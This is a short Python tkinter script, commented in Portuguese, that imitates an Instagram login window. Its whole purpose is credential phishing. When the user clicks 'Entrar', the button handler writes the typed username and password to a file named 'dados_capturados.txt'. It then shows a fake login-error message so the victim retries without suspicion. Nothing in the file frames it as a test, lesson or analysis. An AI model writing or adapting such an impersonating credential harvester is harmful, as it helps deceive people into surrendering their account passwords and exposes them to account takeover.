import tkinter as tk
from tkinter import messagebox

# Função para salvar os dados
def salvar_dados():
    usuario = entrada_usuario.get()
    senha = entrada_senha.get()

    with open("dados_capturados.txt", "a") as arquivo:
        arquivo.write(f"Usuário: {usuario} | Senha: {senha}\n")

    messagebox.showinfo("Login", "Erro ao entrar. Verifique suas credenciais.")
    entrada_usuario.delete(0, tk.END)
    entrada_senha.delete(0, tk.END)

# Interface
janela = tk.Tk()
janela.title("Instagram")
janela.geometry("300x400")
janela.configure(bg="white")

# Logo (simulado)
logo = tk.Label(janela, text="Instagram", font=("Arial", 24, "bold"), bg="white")
logo.pack(pady=30)

# Entrada de usuário
entrada_usuario = tk.Entry(janela, width=30)
entrada_usuario.insert(0, "Telefone, nome de usuário ou email")
entrada_usuario.pack(pady=10)

# Entrada de senha
entrada_senha = tk.Entry(janela, width=30, show="*")
entrada_senha.insert(0, "Senha")
entrada_senha.pack(pady=10)

# Botão Entrar
btn_entrar = tk.Button(janela, text="Entrar", width=25, bg="#3897f0", fg="white", command=salvar_dados)
btn_entrar.pack(pady=20)

janela.mainloop()
